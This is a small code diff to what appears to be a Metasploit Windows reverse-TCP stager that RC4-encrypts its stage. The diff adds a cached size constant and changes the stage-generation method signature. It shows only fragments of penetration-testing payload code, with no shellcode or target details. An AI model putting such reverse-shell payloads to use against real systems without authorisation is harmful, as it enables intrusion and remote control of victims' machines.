@@ -11,6 +11,8 @@ require 'msf/core/handler/reverse_tcp'
 
 module Metasploit3
 
+  CachedSize = 469
+
   include Msf::Payload::Stager
   include Msf::Payload::Windows
 
@@ -81,7 +83,8 @@ module Metasploit3
     ], self.class)
   end
 
-  def generate_stage
+  def generate_stage(opts={})
+    p = super(opts)
     m = OpenSSL::Digest.new('sha1')
     m.reset
     key = m.digest(datastore["RC4PASSWORD"] || "")
